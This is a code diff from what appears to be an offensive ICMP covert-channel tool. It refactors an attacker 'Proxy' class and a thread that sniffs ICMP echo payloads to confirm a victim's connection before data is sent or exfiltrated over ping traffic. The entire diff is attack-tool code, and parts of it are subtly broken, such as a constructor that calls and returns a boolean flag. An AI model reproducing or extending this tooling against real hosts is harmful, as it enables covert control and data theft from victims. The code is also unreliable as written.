@@ -21,8 +21,9 @@ from network_methods import *
 from attacksingleton import * 
 from attacksingleton import _IPx 
 from check_type import * 
-from custom_enum import SENDER_TRUE_SENDER, ATTACK_TYPE, ENTITY
+from custom_enum import SENDER_TYPE, ATTACK_TYPE, ENTITY
 from get_type import *
+from thread_methods import THREADING_EVENT
 
 
 
@@ -33,38 +34,29 @@ def update_data_received(data, data_lock:threading.Lock, data_received):
 
 DEBUG=False  
 default_file_path:str = "./attack_file.json" 
-type_sender=SENDER_TRUE_SENDER 
+type_sender=SENDER_TYPE.TRUE_SENDER 
 use_delay=False 
 timeout_time=20
+attacker_mode=True 
+localhost="127.0.0.1" 
 #--------------------------------    
 class PROXY_THREAD: 
     class VICTIM_CONNECTION: 
-        thread:threading.Thread=None 
-        
         def __init__(self): 
-            def timeout_timer(): 
-                #if not isinstance(oggetto.thread_data,THREAD_VAR): 
-                #    raise TypeError("oggetto non è THREAD_VAR",type(oggetto.thread_data)) 
-                #if not is_threading_Lock(oggetto.thread_data.lock): 
-                #    raise TypeError("lock non valido") 
-                #if not is_boolean(oggetto.thread_data.response): 
-                #    raise TypeError("response non valida")  
-                #oggetto.stop_flag["value"]=True 
-                #oggetto.thread_data.update_response(False) 
-                THREADING_EVENT.set(self.event_pktconn) 
             self.lock:threading.Lock=get_threading_Lock()  
+            self.stop_flag={"value":False} 
             self.response:bool=False  
-            self.event_pktconn=get_threading_Event() 
-            #if not is_threading_Event(event_pktconn): 
-            #    raise TypeError("event_pktconn is not threading.Event",type(event_pktconn)) 
-            self.timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
-            #if not is_threading_Timer(timer): 
-            #    raise TypeError("timer is not threading.Timer",type(timer))  
+            self.event_pktconn:threading.Event=get_threading_Event() 
         
         def start(self, ip_vittima:ipaddress.IPv4Address=None, ip_host:ipaddress.IPv4Address=None): 
+            def timeout_timer(): 
+                with self.lock:
+                    self.response=False 
+                    self.stop_flag["value"]=True 
+                THREADING_EVENT.set(self.event_pktconn) 
             def get_filter(): 
                 #checksum=CALC.checksum(confirm_text.strip().encode()) 
-                IPv4_ECHO_REQU=8 
+                IPv4_ECHO_REQ=8 
                 IPv4_ECHO_REP=0 
                 if ip_vittima.version==4: 
                     icmp="icmp " 
@@ -78,7 +70,7 @@ class PROXY_THREAD:
                     return filter
                 else: 
                     filter=icmp 
-                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQU} or icmp[0]=={IPv4_ECHO_REP}) " 
+                    filter+=f" and (icmp[0]=={IPv4_ECHO_REQ} or icmp[0]=={IPv4_ECHO_REP}) " 
                     filter+=f" and src {ip_vittima.compressed} "
                     filter+=f" and dst {ip_host.compressed}"
                 #filter+=f"and icmp[4:2]={checksum} "
@@ -88,54 +80,25 @@ class PROXY_THREAD:
                 #print(packet.summary()) 
                 if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
                     #and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
-                    if not oggetto.ip_vittima.compressed==packet[IP].src: 
+                    if not ip_vittima.compressed==packet[IP].src: 
                         return 
                     confirm_text=(
                         MSG.CONFIRM_VICTIM.value+
-                        oggetto.ip_vittima.compressed+
-                        oggetto.ip_host.compressed
+                        ip_vittima.compressed+
+                        ip_host.compressed
                     )
                     check_sum=CALC.checksum(confirm_text.encode()) 
                     if confirm_text in packet[Raw].load.decode(): 
-                        print("CONNESSIONE VITTIMA CONFERMATA") 
-                        oggetto.thread_data.update_response(True) 
-                        oggetto.stop_flag["value"]=True 
-                        THREADING_EVENT.set(event_pktconn) 
-                        return        
-            def _old_get_callback(event_pktconn:threading.Event): 
-                #print("MONITORO IL TRAFFICO PER CONFERME DALLA VITTIMA")
-                def callback(packet): 
-                    print(packet.summary()) 
-                    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):   
-                        if not oggetto.ip_vittima.compressed==packet[IP].src: 
-                            return
-                        confirm_text=(
-                            MSG.CONFIRM_VICTIM.value+
-                            oggetto.ip_vittima.compressed+
-                            oggetto.ip_host.compressed
-                        )
-                        check_sum=CALC.checksum(confirm_text.encode()) 
-                        if confirm_text in packet[Raw].load.decode(): 
-                            print("CONNESSIONE VITTIMA CONFERMATA") 
-                            THREADING_EVENT.set(event_pktconn) 
-                            return 
-                return callback 
+                        print("CONNESSIONE VITTIMA CONFERMATA")  
+                        with self.lock:
+                            self.response=True  
+                            self.stop_flag["value"]=True 
+                        THREADING_EVENT.set(self.event_pktconn) 
+                        return 
             def stop_filter(pkt): 
-                return oggetto.stop_flag["value"]  
-            def _old_sniff(): 
-                timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
-                timer.start() 
-                confirm_text=(
-                    MSG.CONFIRM_VICTIM.value+
-                    oggetto.ip_vittima.compressed+
-                    oggetto.ip_host.compressed
-                )  
-                sniff( 
-                    filter=get_filter(confirm_text)
-                    ,prn=get_callback()
-                    ,store=False 
-                    ,stop_filter=stop_filter 
-                )
+                with self.lock:
+                    value=self.stop_flag["value"]
+                return value
             #-----------------------------------
             if not is_ipaddress(ip_vittima): 
                 raise TypeError("Vittima non ha un IP valido")
@@ -143,50 +106,34 @@ class PROXY_THREAD:
                 raise TypeError("Host non ha un IP valido") 
             self.interface=INTERFACE_FROM_IP(ip_vittima).interface 
             if self.interface is None: 
-                raise ValueError("interface is None",self.interface) 
+                raise ValueError("interface is None",self.interface)  
+            timer:threading.Timer=get_timer(timeout_time, lambda: timeout_timer()) 
             sniff_args={
                 "filter":get_filter()
                 #,"count":1 
                 ,"prn":callback_connessione
-                #,"store":True 
+                #,"store":False 
+                #,stop_filter=stop_filter 
                 ,"iface":self.interface 
             } 
-            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args) 
-            if not is_AsyncSniffer(sniffer): 
-                raise TypeError("sniffer is AsyncSniffer",type(sniffer)) 
+            sniffer:AsyncSniffer=get_AsyncSniffer(sniff_args)  
             sniffer.start()
             if sniffer.running: 
                 print("Sniffer started...") 
             else: raise RuntimeError("SNIFFER NOT STARTED") 
-            self.timer.start() 
-            if self.timer.is_alive(): 
-                print("Timer started...") 
-        
-        def wait(self): 
+            timer.start() 
+            if timer.is_alive(): 
+                print("Timer started...")  
             THREADING_EVENT.wait(self.event_pktconn) 
-            if self.timer.is_alive(): 
-                self.timer.cancel()
+            if timer.is_alive(): 
+                timer.cancel()
                 print("Timer stopped...") 
-            self.sniffer.stop()
-            if self.sniffer.running: 
-                raise RuntimeError("SNIFFER NOT STOPPED",self.sniffer.running)
+            sniffer.stop()
+            if sniffer.running: 
+                raise RuntimeError("SNIFFER NOT STOPPED",sniffer.running)
             print("Sniffer stopped...") 
 
-        def update_response(self, response:bool=False): 
-            if not is_boolean(response): 
-                raise TypeError("response non boolean")
-            if not is_threading_Lock(self.lock): 
-                raise TypeError("lock non valido")  
-            with self.lock:
-                self.response=response 
-
-attacker_mode=True 
-localhost="127.0.0.1" 
 class Proxy:  
-    socket_attacker:socket=None #tuple[socket, _RetAddress]
-    thread_data:THREAD_VAR=None 
-    stop_flag={"value":False} 
-
     def __init__(self, ip_attaccante:ipaddress.IPv4Address=None, proxy_port:int=None ): 
         def get_ip_host(): 
             ip_host, errore=IP.find_local_IP() 
@@ -223,22 +170,23 @@ class Proxy:
                 raise TypeError("ip_vittima non valido") 
             print(f"IP VITTIMA",self.ip_vittima) 
         #-------------------------- 
-        if not is_ipaddress(ip_attaccante): 
-            raise TypeError("Indirizzo IP attaccante non valido")  
-        if not is_integer(proxy_port): 
-            raise TypeError("Porta non valida") 
-        self.proxy_port=proxy_port
-        self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
-        self.ip_vittima:ipaddress.IPv4Address=None 
         self.ip_host:ipaddress.IPv4Address=None 
-        self.exfiltred_data:list=[] 
-        self.attack_function:ATTACK_TYPE=None  
         while not is_ipaddress(self.ip_host): 
             self.ip_host=get_ip_host() 
         print(f"IP HOST",self.ip_host) 
+        self.socket_attacker:socket=None #tuple[socket, _RetAddress]  
+        if not is_ipaddress(ip_attaccante): 
+            raise TypeError("Indirizzo IP attaccante non valido")  
+        self.ip_attaccante:ipaddress.IPv4Address=ip_attaccante
         if self.ip_attaccante.compressed==localhost: 
             self.ip_attaccante=self.ip_host 
         print(f"IP ATTACCANTE: {self.ip_attaccante}") 
+        if not is_integer(proxy_port): 
+            raise TypeError("Porta non valida") 
+        self.proxy_port=proxy_port  
+        self.ip_vittima:ipaddress.IPv4Address=None  
+        self.exfiltred_data:list=[] 
+        self.attack_function:ATTACK_TYPE=None 
         if attacker_mode: 
             return attacker_mode() 
     
@@ -318,12 +266,11 @@ class Proxy:
             ) 
             SendSingleton(
                 ATTACK_TYPE.ipv4_echo_payload, 
-                SENDER_TRUE_SENDER, 
+                SENDER_TYPE.TRUE_SENDER, 
                 False 
             ).send_data(confirm_text.encode(), self.ip_vittima) 
             print("Confirm sent to victim...") 
             print("Waiting thread to end...") 
-            thread_victim_connection.wait()  
             with thread_victim_connection.lock: 
                 response=thread_victim_connection.response
             print("Thread has been executed...") 
